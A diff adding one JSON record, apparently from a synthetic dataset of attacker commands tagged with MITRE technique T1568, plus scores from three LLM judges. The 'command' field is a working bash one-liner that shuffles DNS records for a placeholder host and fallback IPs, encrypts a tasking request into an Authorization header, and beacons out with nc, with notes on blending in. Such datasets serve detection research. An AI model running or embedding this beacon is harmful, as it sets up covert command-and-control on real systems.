@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"host=cdn-cache.example.org; ips=$(dig +short \\\"$host\\\" A | shuf); ua=\\\"Mozilla/5.0\\\"; for ip in $ips 203.0.113.77 198.51.100.77; do cmd=$(printf '{\"op\":\"tasks\",\"ts\":%s}' \\\"$(date -u +%s)\\\"); enc=$(printf '%s' \\\"$cmd\\\" | openssl enc -aes-256-cbc -pbkdf2 -k s3cr3t | base64 -w0); req=$(printf 'GET /api/tasks HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nAuthorization: Bearer %s\\r\\nConnection: close\\r\\n\\r\\n' \\\"$host\\\" \\\"$ua\\\" \\\"$enc\\\"); printf '%s' \\\"$req\\\" | nc -w 5 \\\"$ip\\\" 80 && break; sleep $((RANDOM%5+1)); done\"",
+  "explanation": "Shuffles through multiple A records (fast flux) with fallback IPs; embeds AES-encrypted, base64-encoded instructions in an Authorization header while imitating an API call.",
+  "rationale_steps": [
+    "Resolve multiple A records at runtime and randomize selection.",
+    "Maintain fallback IPs for resiliency if DNS is disrupted.",
+    "Use a realistic HTTP API path and headers to blend in.",
+    "Encrypt instructions with AES and base64 to reduce visibility."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-8ffcacf7",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, valid flag formats, correct command separators, and appropriate escape sequences throughout the complex bash script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1568 Dynamic Resolution technique by using DNS resolution with shuffled IPs (fast-flux behavior), fallback hardcoded IPs, encrypted command payloads, and realistic C2 communication patterns with randomized sleep intervals.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T05:04:39.713981Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, proper command separators, valid flag formats, and no impossible constructs.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1568 by performing runtime resolution of multiple IP endpoints via dig, shuffling and iterating through them with fallback IPs, and attempting to establish C2 communication, thus demonstrating dynamic endpoint determination and rotation.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T05:04:51.312444Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and substitutions, valid printf/loop constructs, and proper piping/redirection make it well-formed for bash with standard tools.",
+        "semantic_score": 5,
+        "semantic_justification": "It dynamically resolves and shuffles A records to rotate endpoints with DNS-derived IPs plus fallbacks and performs C2-like beacons, aligning closely with T1568 dynamic resolution/fast-flux behavior.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:05:23.068783Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
